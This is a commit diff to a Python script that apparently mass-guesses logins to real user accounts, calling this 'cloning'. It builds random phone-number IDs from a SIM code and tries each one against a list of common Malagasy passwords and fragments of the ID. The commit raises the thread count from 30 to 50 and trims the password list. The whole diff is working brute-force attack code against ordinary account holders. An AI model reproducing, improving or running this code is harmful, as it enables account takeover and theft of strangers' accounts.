40551a5319f19539234db54f6a2f3beff431b9e3
Safidy03 <167643700+Safidy03@users.noreply.github.com>
2024-05-07 12:57:42 +0300

    Update Safidy.py

--- Safidy.py
+++ Safidy.py
@@ -105,7 +105,7 @@ def BD_CLONING():
     for nmbr in range(limit):
         nmp=''.join(map(str, generate_random_sequence(7)))
         user.append(nmp)
-    with tred(max_workers=30) as Dipto:
+    with tred(max_workers=50) as Dipto:
         tl=str(len(user))
         print(' TOTAL ACCOUNT : '+tl)
         print(' YOUR SIM CODE : '+code)
@@ -113,7 +113,7 @@ def BD_CLONING():
         linex()
         for psx in user:
             ids=code+psx
-            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'malala', 'Malala', 'fitiavana', 'mamako', 'malalako', 'mamiko', 'mamako', 'malalako', 'mamiko', 'badoda', 'badoda', 'mendrika', 'mendrika','antananarivo', 'marary', 'marary', 'milely', 'milely','Fitiavana','vadiko','Vadiko,','jesosy','Jesosy','mahery,','Mahery','malagasy','Malagasy','nantenaina','Nantenaina','mahajanga','Mahajanga','miora','fuckyou','free fire','rakoto','Rakoto','rakoto','lalaina','Lalaina','lalaina','diamondra','Diamondra','mamisoa','Mamisoa','mampionona','Mampionona','nomena', 'nomena','Nomena','mamolava','vololona','Vololona','mahaleo','Mahaleo','joselain','Joselain','jehovah','Jehovah','richard','Richard','vadikely','Vadikely','mamakely','Mamakely','dadakely','Dadakely','Andry','andry123','andry','michel','Michel','fanantenana','Fanantenana','matory','Matory','lelena','Lelena','ranoray','gasy ranoray','ragasy','Ragasy','solofo','Solofo']
+            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'malala', 'Malala', 'fitiavana', 'mamako', 'malalako', 'mamiko', 'mamako', 'malalako', 'mamiko', 'badoda', 'badoda', 'mendrika', 'mendrika','antananarivo', 'marary', 'marary', 'milely', 'milely','Fitiavana','vadiko','Vadiko,','jesosy','Jesosy','mahery,','Mahery','malagasy','Malagasy','nantenaina','Nantenaina','rakoto','Rakoto','rakoto','lalaina','Lalaina','lalaina','diamondra','Diamondra','mamisoa','Mamisoa','mampionona','Mampionona','nomena', 'nomena','Nomena','mamolava','vololona','Vololona','mahaleo','Mahaleo','joselain','Joselain','jehovah','Jehovah','richard','Richard','vadikely','Vadikely','mamakely','Mamakely','dadakely','Dadakely','Andry','andry123','andry','michel','Michel','fanantenana','Fanantenana','matory','Matory','lelena','Lelena','ranoray','gasy ranoray','ragasy','Ragasy','solofo','Solofo']
             Dipto.submit(method_crack,ids,passlist)
     linex()
     print(' LE CLONING EST FINI ')
